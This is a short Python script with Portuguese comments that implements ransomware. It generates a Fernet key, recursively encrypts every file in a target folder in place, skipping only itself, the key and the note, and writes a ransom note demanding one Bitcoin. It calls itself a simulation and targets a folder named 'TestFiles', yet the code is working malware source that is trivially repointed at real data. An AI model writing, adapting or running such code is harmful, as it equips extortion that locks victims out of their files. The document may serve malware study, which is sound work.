from cryptography.fernet import Fernet
import os

# 1. Gerar uma chave de criptografia e salvar
def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_arquivo:
        chave_arquivo.write(chave) # Corrigido: nome da variável

# 2. Carregar a chave salva
def carregar_chave():
    return open("chave.key", "rb").read()

# 3. Criptografar um único arquivo
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    
    # Corrigido: consistência no nome da variável
    dados_criptografados = f.encrypt(dados) 
    
    with open(arquivo, "wb") as file:
        file.write(dados_criptografados)

# 4. Encontrar arquivos para criptografar
def encontrar_arquivos(diretorio):
    lista = []
    # Usamos os.path.abspath para garantir que o caminho seja tratado corretamente
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            # Evita criptografar o script, a chave ou a própria mensagem de resgate
            if nome not in ["ransonware.py", "chave.key", "mensagem_resgate.txt"]:
                lista.append(caminho)
    return lista

# 5. Mensagem de Resgate
def criar_mensagem_resgate(diretorio):
    mensagem = """
    ATENÇÃO: Seus arquivos foram criptografados!
    Para recuperar seus arquivos, envie 1 Bitcoin para o endereço abaixo:
    [ENDEREÇO BITCOIN]
    Após o pagamento, entre em contato para obter a chave.
    """
    # Criar a mensagem dentro da pasta alvo para ser mais visível
    caminho_mensagem = os.path.join(diretorio, "mensagem_resgate.txt")
    with open(caminho_mensagem, "w", encoding="utf-8") as arquivo:
        arquivo.write(mensagem)

# 6. Função principal
def main():
    diretorio_alvo = "TestFiles"
    
    # Verifica se a pasta existe antes de começar
    if not os.path.exists(diretorio_alvo):
        print(f"Erro: A pasta {diretorio_alvo} não foi encontrada.")
        return

    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos(diretorio_alvo)
    
    for arquivo in arquivos:
        try:
            criptografar_arquivo(arquivo, chave)
            print(f"Criptografado: {arquivo}")
        except Exception as e:
            print(f"Erro ao criptografar {arquivo}: {e}")
            
    criar_mensagem_resgate(diretorio_alvo)
    print("\nSimulação concluída com sucesso.")

if __name__ == "__main__":
    main()